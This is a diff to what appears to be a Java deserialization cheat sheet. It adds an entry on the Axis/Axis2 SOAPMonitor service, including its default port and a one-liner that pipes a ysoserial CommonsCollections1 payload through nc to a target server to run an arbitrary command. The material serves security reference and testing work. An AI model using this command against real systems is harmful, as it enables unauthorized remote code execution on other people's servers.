@@ -531,6 +531,16 @@ no spec tool
 
 [JMET](https://github.com/matthiaskaiser/jmet)
 
+##### Axis/Axis2 SOAPMonitor
+- All version (this was deemed by design by project maintainer)
+- Binary
+- Default port : 5001
+- Info : https://axis.apache.org/axis2/java/core/docs/soapmonitor-module.html
+
+> java -jar ysoserial-*-all.jar CommonsCollections1  'COMMAND_HERE' | nc TARGET_SERVER 5001
+
+[ysoserial](#ysoserial)
+
 ### Detect
 ##### Code review
 - *ObjectInputStream.readObject*
